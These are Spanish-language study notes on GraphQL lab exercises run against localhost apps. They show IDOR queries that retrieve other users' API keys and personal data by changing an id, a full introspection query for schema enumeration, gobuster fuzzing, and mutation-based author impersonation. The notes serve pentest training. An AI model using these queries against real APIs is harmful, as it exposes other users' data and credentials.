
# 🌐 GraphQL: IDOR, Introspection y Mutations

## 🔍 Parte Teórica

### 📝 Introducción a GraphQL
GraphQL es un lenguaje de consulta para APIs que permite a los clientes solicitar solo los datos que necesitan, en lugar de recibir respuestas fijas como en REST. Esto lo hace más flexible y eficiente.


---

## 🛠️ Parte Práctica

### 🧪 Laboratorio 1: GraphQL IDOR
1. **Entrada al laboratorio**  
   Directorio: `nodeJs/Graphql-IDOR/`  
   Comandos:
   ```bash
   npm install --force
   npm start
   ```
   - Aplicación en `http://localhost:5000`

2. **Interfaz de login**  
   ```
   # Live demonstration!
   GraphQL
   username []
   password []
   
   Submit Button
   ```
   - Credenciales: `johndoe:password1`

3. **Fuzzing de rutas**  
   ```bash
   gobuster dir -u http://localhost:5000 -w ../hacking/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
   ```
   Resultados destacados:
   ```
   /login (Status: 200)
   /settings (Status: 302)
   ```

4. **Explotación IDOR**  
   - Petición interceptada:
   ```java
   POST /graphql HTTP/1.1
   ...
   {"query":"{ UserInfo (id: 1) {\n api_key\n name\n surname\n date_of_birth\n }}\n"}
   ```
   - Modificación para IDOR:
```graphql
{ UserInfo (id: 2) {
 api_key
 name
 surname
 date_of_birth
}}
```

### 🔎 Enumeración de GraphQL
1. **Laboratorio de Introspection**  
   Directorio: `nodeJs/Graphql-Introspection/`  
   Comandos:
   ```bash
   npm install --force
   npm start
   ```

2. **Consulta básica**  
   ```graphql
   query={__schema{types{name,fields{name}}}
   ```

3. **Consulta completa para Voyager**  

   Para visualizarlo mejor esta bueno utilizar [[GRaphQL Voyager]] que es una herramienta que permite interactuar con APIs GraphQL de manera visual.
   La url acomodada nos quedaria asi
```
http://localhost:5000/graphql?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

   y nos devolvera un json con todos los tipos y campos disponibles en el esquema GraphQL. y ese resultado lo pasamos a [[GRaphQL Voyager]] para visualizarlo mejor.

   > si sale error, a lo que tenga por ejemplo Type, ponerle __`__Type` y a lo que tenga por ejemplo InputValue ponerle `__InputValue` y asi sucesivamente con los tipos que salgan en el json.

   Esto es muy comodo porque al llevarlo al [[GRaphQL Voyager]] podemos ver los tipos y campos de una manera visual y asi podemos ver que tipo de consultas podemos hacer.
   
   URL larga con introspection query → Importar a [[GRaphQL Voyager]]  
   
   ![[Pasted image 20250728000052.png]]

4. **Ejemplo de consultas**  
   ```json
   {"query":"{Users{id}}"}
   {"query":"{Users{username}}"}
   ```

### ✏️ Mutaciones en GraphQL
1. **Laboratorio de Mutations**  
   Directorio: `nodeJs/Graphql-Mutations/`  
   Comandos:
   ```bash
   npm install --force
   npm start
   ```

2. **Ejemplo de mutación**  
   ```json
   {
     "query": "mutation { 
       createPost(
         title: \"This is a new title\", 
         body: \"This is a new post\", 
         author_id: 2
       ) { 
         id, title, body, author_id 
       }
     }"
   }
   ```
   - Modificar `author_id` para suplantación

## 🔗 Recursos Recomendados
- [[BurpSuite]] para interceptar peticiones
- [[gobuster]] para fuzzear rutas
- [[GRaphQL Voyager]] para visualización
- [[Hack Tricks]] GraphQL: [enlace](https://book.hacktricks.xyz/en/network-services-pentesting/pentesting-web/graphql)
- [[OWASP]]
